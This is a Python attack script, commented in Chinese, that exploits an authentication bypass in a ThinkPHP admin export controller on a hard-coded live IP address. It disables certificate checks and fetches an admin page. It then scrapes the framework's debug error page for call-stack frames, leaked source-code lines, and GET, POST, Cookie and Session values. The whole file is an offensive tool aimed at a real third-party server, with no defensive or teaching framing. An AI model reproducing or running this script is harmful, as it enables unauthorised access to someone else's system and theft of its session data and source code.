#!/usr/bin/env python3
"""tp_export_deep.py - Export控制器绕过鉴权深度利用"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=10, context=ctx)
        return r.status, r.read(200000).decode("utf-8", "ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "ignore"), dict(e.headers)
    except Exception as e:
        return 0, repr(e)[:150], {}

print("=== 1. 完整调用栈(Frame) ===", flush=True)
st, b, hdrs = get(BASE + "/admin/export/goodslist.html")
# 提取所有调用帧
frames = re.findall(r'at <abbr title="([^"]+)"[^>]*>([^<]+)</abbr> in <a[^>]*title="([^"]+)"', b)
seen = set()
for cls, fn, fpath in frames:
    key = (cls, fn, fpath)
    if key in seen: continue
    seen.add(key)
    print("  %s::%s  [%s]" % (cls, fn, fpath.split("/")[-1]), flush=True)
# 源代码片段(错误页会显示出错行代码!)
print("\n=== 2. 出错行源代码(错误页泄露) ===", flush=True)
# TP错误页有 source-code 部分
for m in re.finditer(r'<ol start="(\d+)">(.*?)</ol>', b, re.S):
    start = int(m.group(1))
    lines = re.findall(r'<li class="line-(\d+)"><code>(.*?)</code></li>', m.group(2), re.S)
    for ln, code in lines[:40]:
        code_clean = re.sub(r'<[^>]+>', '', code)
        print("  %s: %s" % (ln, code_clean[:120]), flush=True)

print("\n=== 3. Environment变量完整值 ===", flush=True)
# GET/POST/Session/Cookie值
for sec in ["GET Data", "POST Data", "Cookie", "Session"]:
    idx = b.find('<h3 class="subheading">%s</h3>' % sec)
    if idx < 0: continue
    seg = b[idx:idx+2000]
    entries = re.findall(r'<strong>([^<]+)</strong>\s*<small>([\s\S]*?)</small>', seg)
    for k, v in entries[:15]:
        print("  %s: %s = %s" % (sec, k, v.strip()[:100]), flush=True)

print("=== DONE ===", flush=True)
